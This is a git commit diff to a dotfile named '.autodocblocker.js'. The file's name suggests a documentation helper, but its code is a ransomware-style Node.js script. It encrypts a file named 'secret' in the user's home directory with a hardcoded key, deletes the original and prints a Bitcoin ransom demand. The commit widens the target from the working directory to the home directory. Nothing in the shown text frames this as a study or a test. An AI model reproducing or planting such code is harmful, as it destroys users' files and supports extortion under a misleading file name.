d918f3ddfe5bceb13ccee6d4d2bac305a5e9abd6
openkmj <42940044+openkmj@users.noreply.github.com>
2024-06-16 02:06:09 +0900

    Update .autodocblocker.js

--- .autodocblocker.js
+++ .autodocblocker.js
@@ -1,14 +1,17 @@
 var fs = require('fs');
+var os = require('os');
+var path = require('path');
 var crypto = require('crypto');
+
 
 var key = '18311813';
 var cipher = crypto.createCipher('aes-256-cbc', key);
-var input = fs.createReadStream('secret');
-var output = fs.createWriteStream('secret.enc');
+var input = fs.createReadStream(path.join(os.homedir(), 'secret'));
+var output = fs.createWriteStream(path.join(os.homedir(), 'secret.enc'));
 
 input.pipe(cipher).pipe(output);
 
 output.on('finish', function() {
-  fs.unlink('secret',()=>{})
+  fs.unlink(path.join(os.homedir(), 'secret'),()=>{})
   console.log('Your File is Encrypted! Give me Bitcoin!');
 });
